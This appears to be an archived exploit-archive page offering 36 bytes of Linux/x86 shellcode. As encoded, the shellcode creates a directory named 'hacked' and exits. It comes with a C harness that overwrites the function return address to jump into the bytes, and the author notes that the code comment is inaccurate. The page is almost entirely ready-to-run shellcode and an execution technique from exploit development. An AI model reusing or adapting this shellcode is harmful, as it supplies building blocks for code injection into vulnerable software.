<html><head><title>Linux/x86 - mkdir() &amp; exit() - 36 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>


The comment in that file is not correct.. I cut and pasted the shell code
in an existing c source and forgot to adjust it..

/*
 * This shellcode will do a mkdir() of 'hacked' and then an exit()
 * Written by zillion@safemode.org
 *
 */

char shellcode[]=
        &quot;\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed&quot;
        &quot;\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68&quot;
        &quot;\x61\x63\x6b\x65\x64\x23&quot;;


void main()
{

  int *ret;
  ret = (int *)&amp;ret + 2;
  (*ret) = (int)shellcode;
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
